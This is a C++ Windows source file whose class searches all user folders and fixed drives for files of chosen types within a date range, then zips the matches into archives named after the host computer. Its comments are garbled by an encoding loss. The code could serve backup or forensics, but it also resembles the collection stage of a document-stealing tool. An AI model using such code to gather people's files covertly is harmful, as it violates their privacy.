#include "StdAfx.h"
#include "CFile.h"

#include <shellapi.h>
#include <Shlwapi.h>
#include <shlobj.h>
#include <WinIoCtl.h>
#pragma comment(lib, "shlwapi.lib")

#include <winnetwk.h>
#pragma comment(lib,"mpr.lib")

#include "../zip/ZipArchive.h"	//zip�ļ�ѹ����

#ifdef _DEBUG
#pragma comment(lib,"../zip/ZipArchive_D.lib")
#else
#pragma comment(lib,"../zip/ZipArchive.lib")
#endif

#define MIN_COMPRESS_SPAN_SIZE			1024*1024	    //��С�־�ѹ������С 1M
#define MAX_COMPRESS_SPAN_SIZE			2*1024*1024*1024 - 1	//���־�ѹ������С 2G 

CDFile::CDFile(void)
{
	m_pZipArchive = new CZipArchive();
}

CDFile::~CDFile(void)
{
	this->OnClearFileListCatch();

	if (m_pZipArchive) {
		delete m_pZipArchive;
	}
}

BOOL CDFile::OnSearechFile(TCHAR* szFileType,TCHAR* szSearchDir,TCHAR* szStartTime,TCHAR* szEndTime,BOOL bIsSearchAll)
{
    //��ȡ�����ļ�ʱ��
    time_t tm_Start = StringToDatetime(szStartTime);
    time_t tm_End   = StringToDatetime(szEndTime);

	FILETIME ftSrart,ftEnd;
	//��ʼʱ��
	LONGLONG ll = Int32x32To64(tm_Start, 10000000) + 116444736000000000;
	ftSrart.dwLowDateTime = (DWORD) ll;
	ftSrart.dwHighDateTime = (DWORD)(ll >> 32);
	
	//����ʱ��
	ll = Int32x32To64(tm_End, 10000000) + 116444736000000000;
	ftEnd.dwLowDateTime = (DWORD) ll;
	ftEnd.dwHighDateTime = (DWORD)(ll >> 32);
 
	FileSearchFilter FileSearch;
	FileSearch.pftCreateBegin	= &ftSrart;
	FileSearch.pftCreateEnd		= &ftEnd;
	FileSearch.pftAccessBegin	= &ftSrart;
	FileSearch.pftAccessEnd		= &ftEnd;
	FileSearch.pftWriteBegin	= &ftSrart;
	FileSearch.pftWriteEnd		= &ftEnd;

	TCHAR* pStart = szFileType;
	TCHAR* pNext = pStart;

	DWORD dwKeySize = _tcslen(szFileType);

	//��ʼ���ļ���������
	for(int nSize=0; nSize!=dwKeySize; nSize++)
	{
		if(*pNext == '|')
		{
			CString strAdd;
			strAdd.Append(pStart, pNext-pStart);
			FileSearch.arrayType.Add(strAdd);
			pStart = pNext;
			pStart++;
		}
		pNext++;
	}

	if(pNext != pStart)
	{
		CString strAdd;
		strAdd.Append(pStart, pNext-pStart);
		FileSearch.arrayType.Add(strAdd);
	}
   
	//���list��������
	OnClearFileListCatch();

	if(FALSE == bIsSearchAll)
	{
		this->OnSearchAllFile(szSearchDir, &FileSearch);
	}
	else
	{
		this->OnSearchAllDiskFile(&FileSearch);
	}
	
	TCHAR szSource[MAX_PATH]   = {0};
	TCHAR szTemp[MAX_PATH]     = {0};
	::GetModuleFileName(NULL,szSource,MAX_PATH);
	int nPathLen = 0;
	for (int i = 0; i != MAX_PATH; i++)
	{
		if (!szSource[i])
		{ break; }

		if (szSource[i] == _T('\\'))
		{ nPathLen = i; }
	}
	szSource[nPathLen] = _T('\0');
    
	//��ȡ������
	TCHAR szHostName[MAX_PATH] = _T("");
	DWORD dwNameLen = MAX_PATH;
	::GetComputerName(szHostName, &dwNameLen);

	 _tcscat_s(szSource,MAX_PATH,_T("\\"));
	 _tcscat_s(szSource,MAX_PATH,szHostName);
	 _tcscat_s(szSource,MAX_PATH,szStartTime);
	 _tcscat_s(szSource,MAX_PATH,_T("--"));
	 _tcscat_s(szSource,MAX_PATH,szEndTime);
	 _tcscat_s(szSource,MAX_PATH,_T("\\"));
	  _tcscat_s(szSource,MAX_PATH,szHostName);
	 _tcscat_s(szSource,MAX_PATH,szStartTime);
	 _tcscat_s(szSource,MAX_PATH,_T("--"));
	 _tcscat_s(szSource,MAX_PATH,szEndTime);
	 _tcscat_s(szSource,MAX_PATH,_T(".zip"));
	 

	/*SYSTEMTIME sysTime;
	::GetSystemTime(&sysTime);
	::_stprintf_s(szTemp, MAX_PATH, _T("\\FileCompress\\%.2d%.2d%.2d%.2d.zip"), sysTime.wMonth, sysTime.wDay, sysTime.wHour, sysTime.wMinute);
    _tcscat_s(szSource,MAX_PATH,szTemp);*/
    //::MessageBoxA(NULL,"search ok","1",0);
	OnFileCompress(szSource,MAX_COMPRESS_SPAN_SIZE,true);

	return TRUE;
}



BOOL CDFile::IsTargetFile(PWIN32_FIND_DATA pstFindData, pFileSearchFilter pFileSearch)
{
	if(pFileSearch->pftCreateBegin->dwHighDateTime != 0 &&
		pFileSearch->pftCreateEnd->dwHighDateTime != 0 &&
		pFileSearch->pftAccessBegin->dwHighDateTime != 0 &&
		pFileSearch->pftAccessEnd->dwHighDateTime != 0 &&
		pFileSearch->pftWriteBegin->dwHighDateTime != 0 &&
		pFileSearch->pftWriteEnd->dwHighDateTime != 0)
	{
		if(-1 == ::CompareFileTime(&pstFindData->ftCreationTime, pFileSearch->pftCreateBegin) ||
			1 == ::CompareFileTime(&pstFindData->ftCreationTime, pFileSearch->pftCreateEnd) )
		{
			if(-1 == ::CompareFileTime(&pstFindData->ftLastAccessTime, pFileSearch->pftAccessBegin) ||
				1 == ::CompareFileTime(&pstFindData->ftLastAccessTime, pFileSearch->pftAccessEnd) )
			{
				if(-1 == ::CompareFileTime(&pstFindData->ftLastWriteTime, pFileSearch->pftWriteBegin) ||
					1 == ::CompareFileTime(&pstFindData->ftLastWriteTime, pFileSearch->pftWriteEnd) )
				{
					return FALSE;
				}
			}
		}
	}

	//TCHAR* pType = pstFindData->cFileName;
	//int i = 0;

	//for(; i!=MAX_PATH;i++)
	//{
	//	if(*pType == '.')
	//	{
	//		pType++;
	//		break;
	//	}
	//	pType++;
	//}
	////û���ļ�����
	//if(i == MAX_PATH)
	//	return FALSE;

    wstring  strType = pstFindData->cFileName;
	//û���ļ�����
	if( !wcsstr(strType.c_str(),L".") )
		return FALSE;

	wstring suffixStr = strType.substr(strType.find_last_of('.') + 1);
	
	
	int nCount = pFileSearch->arrayType.GetCount();
	for(int i=0; i!=nCount; i++)
	{
		CString strType = pFileSearch->arrayType.GetAt(i);
		if( _tcsicmp(strType.GetBuffer(0),suffixStr.c_str()) == 0 )
			return TRUE;
	}
	return FALSE;
}

VOID CDFile::OnSearchAllFile(LPCTSTR pszSearchPath, pFileSearchFilter pFileSearch)
{
	//����ָ���ļ�
	WIN32_FIND_DATA	stFindData;
	CString	szFindPath;
	szFindPath.Append(pszSearchPath);

	szFindPath.Append(_T("\\*.*"));

	HANDLE hFind = ::FindFirstFile(szFindPath, &stFindData);
	if(INVALID_HANDLE_VALUE == hFind)
	{
		return ;
	}
	//����
	do
	{
		//��ǰ������·����
		szFindPath.Empty();
		szFindPath.Format(_T("%s\\%s"), pszSearchPath, stFindData.cFileName);
		//�ļ��л����ļ�
		if(stFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			//�ų�������ʱĿ¼
			if(	0 != _tcscmp(stFindData.cFileName, _T(".")) &&
				0 != _tcscmp(stFindData.cFileName, _T("..")) &&
				0 != _tcscmp(szFindPath.GetBuffer(0),_T("C:\\Users\\All Users")) &&
				0 != _tcscmp(szFindPath.GetBuffer(0),_T("C:\\Users\\Default")) && 
				0 != _tcscmp(szFindPath.GetBuffer(0),_T("C:\\Users\\Public")) &&
				0 != _tcscmp(szFindPath.GetBuffer(0),_T("C:\\Documents and Settings\\Default User")) &&
				0 != _tcscmp(szFindPath.GetBuffer(0),_T("C:\\Documents and Settings\\All Users")) )
			{
				//����Sleepһ�£�����ݹ�ѭ��̫�ർ�¼����������
				Sleep(1);
				//�ݹ�
				this->OnSearchAllFile(szFindPath, pFileSearch);
			}

		}
		else
		{//�ļ�
			if(stFindData.nFileSizeLow > 7*1024)
			{//����7k
				if(this->IsTargetFile(&stFindData, pFileSearch))
				{
					LPWIN32_FIND_DATA lpFindData = new WIN32_FIND_DATA;
					if(NULL == lpFindData)
					{
						return ;
					}
					memcpy(lpFindData, &stFindData, sizeof(WIN32_FIND_DATA));
					//ȡ���ļ�ȫ·��
					_tcsncpy_s(	lpFindData->cFileName, 
						MAX_PATH, 
						szFindPath.GetBuffer(0), 
						szFindPath.GetLength()
						);

					this->m_listFile.push_back(lpFindData);
				}
			}
		}
	} while(::FindNextFile(hFind, &stFindData));

	if(hFind != INVALID_HANDLE_VALUE)
	{
		::FindClose(hFind);
	}
}

VOID CDFile::OnSearchAllDiskFile(pFileSearchFilter pFileSearch)
{
	TCHAR szPath[MAX_PATH]		= _T("C:\\");
	TCHAR szDrive[MAX_PATH]		= _T("");
	TCHAR szSearch[5]			= _T("");

	if( PathFileExists(_T("C:\\Users")) )
	{//WIN7����
		//�û�Ŀ¼
		OnSearchAllFile(_T("C:\\Users"), pFileSearch);

		//����վ
		//OnSearchAllFile(_T("C:\\$Recycle.Bin"), pFileSearch);
	}
	else if( PathFileExists(_T("C:\\Documents and Settings")) )
	{//xp
		OnSearchAllFile(_T("C:\\Documents and Settings"), pFileSearch);

		//OnSearchAllFile(_T("C:\\RECYCLER"), pFileSearch);
		
	}
	else
	{//����
		::SHGetSpecialFolderPath(NULL, szPath, CSIDL_DESKTOP, FALSE);
		//�����û��ļ���(����)
		OnSearchAllFile(szPath, pFileSearch);

		SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, szPath);
		//�����û��ļ���(�ҵ��ĵ�)
		OnSearchAllFile(szPath, pFileSearch);	
	}
	
	//������ϵͳ��������
	DWORD dwDriveSize = ::GetLogicalDriveStrings(MAX_PATH, szDrive);

	for (TCHAR* pszIndex = szDrive; *pszIndex; pszIndex += _tcslen(pszIndex)+1)
	{
		if(*pszIndex == *szPath)
			continue;

		if(DRIVE_FIXED == GetDriveType(pszIndex))
		{
			szSearch[0] = *pszIndex;
			szSearch[1] = _T(':');
			szSearch[2] = _T('\0');

			//::MessageBox(NULL,szSearch,L"1",0);	
			OnSearchAllFile(szSearch, pFileSearch);
		}
	}
}


BOOL CDFile::OnFileCompress(TCHAR* szSaveDir,int dwPkgSize,BOOL bSearch)
{
	BOOL bResult = FALSE;
    
	do
	{
		if(!MakeFolderExsits(szSaveDir))
		{
			break;
		}

		if(!m_pZipArchive->IsClosed())
		{
			m_pZipArchive->Close();
		}

		int nVolSize = dwPkgSize;

		if(nVolSize >= MIN_COMPRESS_SPAN_SIZE)
		{
			m_pZipArchive->Open(szSaveDir, CZipArchive::zipCreateSpan, nVolSize);
		}
		else
		{
			m_pZipArchive->Open(szSaveDir, CZipArchive::zipCreate);
		}

		if(bSearch)
		{
			//ѹ�����ҵ����ļ�
			bResult = OnCompressAllListFile(szSaveDir);
			m_pZipArchive->Close();
			break;
		}

	    m_pZipArchive->AddNewFile(szSaveDir, -1, false);

		m_pZipArchive->Close();

		bResult = TRUE;

	}while(FALSE);

	return bResult;
}


BOOL CDFile::MakeFolderExsits(TCHAR* lpszPath)
{
	TCHAR szPath[MAX_PATH] = _T("");

	for(int i=0; i!=MAX_PATH; i++)
	{
		if(!lpszPath[i])
		{
			break;
		}

		if(lpszPath[i] == '\\')
		{
			if(!::PathFileExists(szPath))
			{
				if(!::CreateDirectory(szPath, NULL))
					return FALSE;
			}
		}

		szPath[i] = lpszPath[i];
	}

	return TRUE;
}


BOOL CDFile::OnCompressAllListFile(LPCTSTR lpszFileName)
{
	BOOL bResult = TRUE;
	LPWIN32_FIND_DATA lpData = NULL;
	list<LPWIN32_FIND_DATA>::iterator it;

	for (it = this->m_listFile.begin(); this->m_listFile.end() != it; ++it)
	{
		lpData = (LPWIN32_FIND_DATA)(*it);
		if (!m_pZipArchive->AddNewFile(lpData->cFileName))
		{
			bResult = FALSE;
			break;
		}
	}

	return bResult;
}

VOID CDFile::OnClearFileListCatch()
{
	LPWIN32_FIND_DATA lpData = NULL;
	list<LPWIN32_FIND_DATA>::iterator it = this->m_listFile.begin();
	list<LPWIN32_FIND_DATA>::iterator end = this->m_listFile.end();
	for(it ; it != end; ++it)
	{
		lpData = (LPWIN32_FIND_DATA)(*it);
		delete lpData;
	}
	this->m_listFile.clear();
}


time_t CDFile::StringToDatetime(TCHAR *str)  
{  
    tm tm_;  
    int year, month, day;  
    swscanf(str,_T("%d-%d-%d"), &year, &month, &day);  
    tm_.tm_year  = year-1900;  
    tm_.tm_mon   = month-1;  
    tm_.tm_mday  = day;  
    tm_.tm_hour  = 0;  
    tm_.tm_min   = 0;  
    tm_.tm_sec   = 0;  
    tm_.tm_isdst = 0;  
  
    time_t t_ = mktime(&tm_); //�Ѿ�����8��ʱ��  
    return t_; //��ʱ��  
}  